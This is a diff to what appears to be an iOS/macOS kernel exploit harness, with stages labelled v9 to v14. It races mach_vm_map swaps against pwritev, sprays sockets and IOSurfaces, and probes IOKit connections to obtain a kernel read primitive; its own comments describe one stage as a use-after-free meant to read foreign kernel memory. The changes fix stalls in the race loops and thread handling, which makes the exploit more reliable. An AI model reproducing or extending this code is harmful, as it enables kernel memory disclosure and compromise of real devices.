@@ -188,6 +188,26 @@ static void *rc_swap_thread(void *arg) {
     return NULL;
 }
 
+/* 2026-11-19 pre-write freeze fix: bound every 'while (rc_raceOn == 1)'
+   spin. The swap thread clears rc_raceOn only if its mach_vm_map RETURNS;
+   a genuine kernel-side wedge must end the stage honestly, not freeze the
+   tap at its last pre-write line. 5 s bound, 200 us poll.
+   0 = cleared; -1 = stalled (sets rc_swap_dead — stop racing this boot). */
+static volatile int rc_swap_dead = 0;
+static int g_rcSwapRearmed = 0;
+static int rc_raceOn_wait(uint64_t ms) {
+    struct timespec t0, t1;
+    clock_gettime(CLOCK_MONOTONIC, &t0);
+    while (rc_raceOn == 1) {
+        clock_gettime(CLOCK_MONOTONIC, &t1);
+        uint64_t el = (uint64_t)(t1.tv_sec - t0.tv_sec) * 1000ull +
+                      ((uint64_t)t1.tv_nsec - (uint64_t)t0.tv_nsec) / 1000000ull;
+        if (el >= ms) { rc_swap_dead = 1; return -1; }
+        usleep(200);
+    }
+    return 0;
+}
+
 /* The ClearSword Socket Spray Thread (SOCK_DGRAM) */
 static void *rc_socket_spray_thread(void *arg) {
     (void)arg;
@@ -274,29 +294,47 @@ static void *rc_socket_spray_thread(void *arg) {
    harmless), caller decides (munlock/teardown/continue). */
 static volatile int rc_pwritev_done14 = 0;
 static volatile int rc_pwritev_rv14 = 0;
+/* 2026-11-19 freeze fix: the old waiter called pthread_cond_timedwait on a
+   condvar NOBODY signals, with the mutex not held (UB) — the fast path
+   burned the full 5 s budget on EVERY call and the wedge path relied on
+   accident. Proper protocol: worker signals under the mutex; the waiter
+   holds the mutex and returns the instant done flips; -2 only on real
+   timeout (the worker stays parked in its one blocked syscall). */
 struct rc_pw14_args { int fd; struct iovec iov; off_t ofs; };
+static pthread_mutex_t rc_pw14_mu = PTHREAD_MUTEX_INITIALIZER;
+static pthread_cond_t  rc_pw14_cv = PTHREAD_COND_INITIALIZER;
 static void *rc_pw14_worker(void *arg) {
     struct rc_pw14_args *a = (struct rc_pw14_args *)arg;
     ssize_t w = pwritev(a->fd, &a->iov, 1, a->ofs);
+    pthread_mutex_lock(&rc_pw14_mu);
     rc_pwritev_rv14 = (int)w;
     rc_pwritev_done14 = 1;
+    pthread_cond_broadcast(&rc_pw14_cv);
+    pthread_mutex_unlock(&rc_pw14_mu);
     return NULL;
 }
 static int rc_pwritev_bounded14(int fd, void *base, size_t len, off_t ofs, uint64_t ms) {
     static struct rc_pw14_args args;
     args.fd = fd; args.iov.iov_base = base; args.iov.iov_len = len; args.ofs = ofs;
+    pthread_mutex_lock(&rc_pw14_mu);
     rc_pwritev_done14 = 0; rc_pwritev_rv14 = 0;
-    pthread_t th; if (pthread_create(&th, NULL, rc_pw14_worker, &args) != 0) return pwritev(fd, base, len, ofs);
+    pthread_mutex_unlock(&rc_pw14_mu);
+    pthread_t th;
+    if (pthread_create(&th, NULL, rc_pw14_worker, &args) != 0)
+        return (int)pwritev(fd, base, len, ofs);   /* rare sync fallback */
     struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
     ts.tv_sec += (time_t)(ms / 1000);
     ts.tv_nsec += (long)(ms % 1000) * 1000000L;
     if (ts.tv_nsec >= 1000000000L) { ts.tv_sec += 1; ts.tv_nsec -= 1000000000L; }
-    pthread_mutex_t mu = PTHREAD_MUTEX_INITIALIZER;
-    pthread_cond_t cv = PTHREAD_COND_INITIALIZER;
-    pthread_cond_timedwait(&cv, &mu, &ts);
-    pthread_mutex_unlock(&mu);
+    int rv = -2;
+    pthread_mutex_lock(&rc_pw14_mu);
+    while (!rc_pwritev_done14) {
+        if (pthread_cond_timedwait(&rc_pw14_cv, &rc_pw14_mu, &ts) == ETIMEDOUT) break;
+    }
+    if (rc_pwritev_done14) rv = rc_pwritev_rv14;
+    pthread_mutex_unlock(&rc_pw14_mu);
     pthread_detach(th);
-    return rc_pwritev_done14 ? rc_pwritev_rv14 : -2;
+    return rv;
 }
 
 @implementation LSIDCalib
@@ -747,6 +785,7 @@ static CFNumberRef RCNUM(int64_t v) {
                     g_rcHoldCap, (unsigned long long)rl.rlim_cur);
     }
     rc_started = 0; rc_go = 1; rc_raceOn = 0; rc_mapErr = 0;
+    rc_swap_dead = 0; g_rcSwapRearmed = 0;
     rc_sprayGo = 1;
     rc_sprayAllocs = 0;
     rc_sprayFrees = 0;
@@ -767,7 +806,7 @@ static CFNumberRef RCNUM(int64_t v) {
             *(uint64_t *)(pcSmall + 0x3f00) = hmarker;
             rc_raceOn = 1;
             ssize_t w = pwritev(fdZero, &iov, 1, 0x3f00);
-            while (rc_raceOn == 1);
+            if (rc_raceOn_wait(5000) < 0) { rc_log("[H STALL] swap wedged >5 s (kernel) — H control aborted"); break; }
             if (w == -1) {
                 wFail++;
                 uint64_t rb = 0;
@@ -792,6 +831,7 @@ static CFNumberRef RCNUM(int64_t v) {
     uint64_t rc_hotOffs[32]; uint32_t rc_hotN = 0;
 
     for (uint32_t start = 0; start + 1 < npages; start += RC_STRIDE) {
+        if (rc_swap_dead) break;   /* 2026-11-19: kernel-side wedge — sweep over */
         mach_vm_offset_t off = (mach_vm_offset_t)start * vm_page_size;
         uint32_t expected = start + 1;
         rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = off;
@@ -807,7 +847,7 @@ static CFNumberRef RCNUM(int64_t v) {
             rc_raceOn = 1;
             ssize_t w = pwritev(fdMark, &iov, 1, 0x3f00);
             int e = errno;
-            while (rc_raceOn == 1);
+            if (rc_raceOn_wait(5000) < 0) { rc_log("[ID STALL] swap wedged >5 s at off=0x%llx (kernel) — sweep aborted", (unsigned long long)off); break; }
 
             int isFail = (w == -1);
             if (isFail) {
@@ -915,6 +955,7 @@ static CFNumberRef RCNUM(int64_t v) {
                nHot, rc_hotN, warmN);
         uint64_t hw = 0, hf = 0, hp = 0; int hr2 = 0;
         for (uint32_t ho = 0; ho < nHot; ho++) {
+            if (rc_swap_dead) break;
             uint64_t off = hot[ho];
             uint32_t pg = (uint32_t)(off / vm_page_size);
             for (int it2 = 0; it2 < 200; it2++) {
@@ -927,7 +968,7 @@ static CFNumberRef RCNUM(int64_t v) {
                 rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                 rc_raceOn = 1;
                 { int wH = rc_pwritev_bounded14(fdMark, iovH.iov_base, iovH.iov_len, 0x3f00, 5000); (void)wH; }
-                while (rc_raceOn == 1);
+                if (rc_raceOn_wait(5000) < 0) { rc_log("[v10 STALL] swap wedged >5 s at hot 0x%llx (kernel) — tuner aborted", (unsigned long long)off); break; }
                 pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
                 uint64_t got = 0; int32_t delta = 0;
                 rc_cls_t c2 = rc_cls(rbBuf, pg + 1, npages, &got, &delta);
@@ -995,7 +1036,8 @@ static CFNumberRef RCNUM(int64_t v) {
     rc_sprayGo = 0;
     pthread_join(th, NULL);
     pthread_join(thSpray, NULL);
-
+    rc_raceOn = 0;   /* 2026-11-19: the swap thread exits with the flag stuck
+                        at 1 — clear it or every post-sampler spin is dead */
     /* ---- v9 SPLIT-SAMPLER (secondary, spray OFF — kept as the NEGATIVE
        CONTROL after 10-24 evidence: 20 hot offsets → 0 events. It proves the
        window is schedule-shape-dependent, not a delay-sweep dial.) ---- */
@@ -1074,6 +1116,22 @@ static CFNumberRef RCNUM(int64_t v) {
         rc_log("[calib] knob cscalib=%s plan=%s%s%s%s", knv[0] ? knv : "(unset)",
                g_runWhole ? "v12 " : "", g_runMlock ? "v12.2 " : "",
                g_runV13 ? "v13 " : "", g_runV14 ? "v14 " : "");
+    /* 2026-11-19 pre-write freeze fix (root cause): v12 / v12.2 / v13 /
+       v14 all race via rc_raceOn, but the swap thread was joined at the
+       v9 boundary — the flag stuck at 1 and the first post-sampler
+       "pre-write" spin froze the tap forever. Re-arm the swap thread for
+       the racing stages; the tail joins it before teardown. */
+    if (g_runWhole || g_runMlock || g_runV13 || g_runV14) {
+        rc_go = 1;
+        if (pthread_create(&th, NULL, rc_swap_thread, NULL) == 0) {
+            g_rcSwapRearmed = 1;
+            rc_log("[calib] swap thread re-armed for the racing stages");
+        } else {
+            rc_go = 0;
+            rc_log("[calib STOP] swap re-arm failed — racing stages skipped");
+            g_runWhole = NO; g_runMlock = NO; g_runV13 = NO; g_runV14 = NO;
+        }
+    }
     /* ---- v12 RECLAIM: free our page, let the kernel reuse it, re-race
        the same stale index. FOREIGN content in the window = real kread.
        PANIC-POSSIBLE (UAF-class by construction); solo tap, one per
@@ -1134,6 +1192,7 @@ static CFNumberRef RCNUM(int64_t v) {
                 for (int it2p = 0; it2p < 2; it2p++)
                     rc_log("[v12 stall-probe %d] ready", it2p);
                 for (uint32_t ho = 0; ho < rc_hotN + 1 && ho < 24; ho++) {
+                    if (rc_swap_dead) break;
                     if (rc_hotN == 0 && warmN == 0) break;
                     uint64_t off = (ho < rc_hotN)
                         ? rc_hotOffs[ho] : rc_warm[warmN - 1];
@@ -1156,7 +1215,7 @@ static CFNumberRef RCNUM(int64_t v) {
                         rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                         rc_raceOn = 1;
                         { int w12 = rc_pwritev_bounded14(fdMark, iov12.iov_base, iov12.iov_len, 0x3f00, 5000); (void)w12; }
-                        while (rc_raceOn == 1);
+                        if (rc_raceOn_wait(5000) < 0) { rc_log("[v12 STALL] swap wedged >5 s at off=0x%llx (kernel) — window aborted", (unsigned long long)off); break; }
                         if (ho == 0 && it2 < 2)
                             rc_log("[v12 stall-probe %d] post-write", it2);
                         pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
@@ -1232,6 +1291,7 @@ static CFNumberRef RCNUM(int64_t v) {
         rfillB2 = ~rfillA;
         uint32_t bound22 = 0, refused22 = 0, hits22 = 0, ours22 = 0;
         for (uint32_t ci = 0; ci < candN; ci++) {
+            if (rc_swap_dead) break;
             uint64_t off = cand22[ci];
             IOSurfaceRef s22 = NULL;
             {
@@ -1272,8 +1332,8 @@ static CFNumberRef RCNUM(int64_t v) {
                 rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                 rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                 rc_raceOn = 1;
-                pwritev(fdMark, &iov22, 1, 0x3f00);
-                while (rc_raceOn == 1);
+                { int w22 = rc_pwritev_bounded14(fdMark, iov22.iov_base, iov22.iov_len, 0x3f00, 5000); (void)w22; }   /* was a DIRECT unbounded pwritev */
+                if (rc_raceOn_wait(5000) < 0) { rc_log("[v12.2 STALL] swap wedged >5 s at off=0x%llx (kernel) — stage aborted", (unsigned long long)off); break; }
                 pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
                 uint64_t got22 = 0; int32_t dlt22 = 0;
                 rc_cls_t c22 = rc_cls(rbBuf, pg22 + 1, npages, &got22, &dlt22);
@@ -1349,6 +1409,7 @@ static CFNumberRef RCNUM(int64_t v) {
                 rc_log("[v13] scan: %u conn candidates (sel=3 probe on each)",
                        (unsigned)cands13.count);
                 for (NSNumber *pc13 in cands13) {
+                    if (rc_swap_dead) break;
                     io_connect_t c13 = (io_connect_t)pc13.unsignedIntValue;
                     kern_return_t k1 = v13_sTrap2(c13, 3, v13Rid, 1);
                     if (k1 == KERN_SUCCESS) { owner13 = c13; vol13 = 1; break; }
@@ -1364,6 +1425,7 @@ static CFNumberRef RCNUM(int64_t v) {
                     if (warmN && cand13N < 8) cand13[cand13N++] = rc_warm[warmN - 1];
 
                     for (uint32_t w13 = 0; w13 < cand13N; w13++) {
+                        if (rc_swap_dead) break;
                         uint64_t off13 = cand13[w13];
                         uint32_t pg13 = (uint32_t)(off13 / vm_page_size);
                         for (int it13 = 0; it13 < 25; it13++) {
@@ -1378,8 +1440,8 @@ static CFNumberRef RCNUM(int64_t v) {
                             rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                             rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off13;
                             rc_raceOn = 1;
-                            pwritev(fdMark, &iov13, 1, 0x3f00);
-                            while (rc_raceOn == 1);
+                            { int w13b = rc_pwritev_bounded14(fdMark, iov13.iov_base, iov13.iov_len, 0x3f00, 5000); (void)w13b; }   /* was a DIRECT unbounded pwritev */
+                            if (rc_raceOn_wait(5000) < 0) { rc_log("[v13 STALL] swap wedged >5 s at off=0x%llx (kernel) — stage aborted", (unsigned long long)off13); break; }
                             pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
                             uint64_t got13 = 0; int32_t dlt13 = 0;
                             rc_cls_t c13c = rc_cls(rbBuf, pg13 + 1, npages, &got13, &dlt13);
@@ -1446,6 +1508,7 @@ static CFNumberRef RCNUM(int64_t v) {
         uint64_t vpat = 0x1337C0DE12345678ULL, vpat2 = ~vpat;
         uint32_t bound14 = 0, refused14 = 0, spray14 = 0, sprayOwn14 = 0, hits14 = 0, fpOurs14 = 0;
         for (uint32_t ci = 0; ci < cand14N; ci++) {
+            if (rc_swap_dead) break;
             uint64_t off = cand14[ci];
             IOSurfaceRef s14 = NULL;
             {
@@ -1501,7 +1564,7 @@ static CFNumberRef RCNUM(int64_t v) {
                 { int w14 = rc_pwritev_bounded14(fdMark, iov14.iov_base, iov14.iov_len, 0x3f00, 5000);
                   if (w14 == -2) rc_log("[v14 STALL] pre-write pwritev blocked >5 s — bounded stop; next window");
                 }
-                while (rc_raceOn == 1);
+                if (rc_raceOn_wait(5000) < 0) { rc_log("[v14 STALL] swap wedged >5 s at off=0x%llx (kernel) — window aborted", (unsigned long long)off); break; }
                 if (it14 == 0) rc_log("[v14] window %u post-write", ci);
                 pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
                 uint64_t got14 = 0; int32_t dlt14 = 0;
@@ -1545,6 +1608,15 @@ static CFNumberRef RCNUM(int64_t v) {
     rc_log("OK=M0 + FAIL=ZERO = swap either loses (copy M0) or wins too early (EFAULT, no copy).");
     rc_log("OK=CORRECT = swap won and pwritev copied M1 correctly (no confusion).");
     rc_log("DONE — paste this text back");
+
+    /* 2026-11-19: stop the re-armed swap thread BEFORE unmapping its
+       objects (the 994-boundary join pattern + sticky-flag clear). */
+    if (g_rcSwapRearmed) {
+        rc_go = 0; rc_raceOn = 1;
+        pthread_join(th, NULL);
+        rc_raceOn = 0;
+        g_rcSwapRearmed = 0;
+    }
 
     close(fdZero); close(fdMark);
     if (lockSurf) CFRelease(lockSurf);
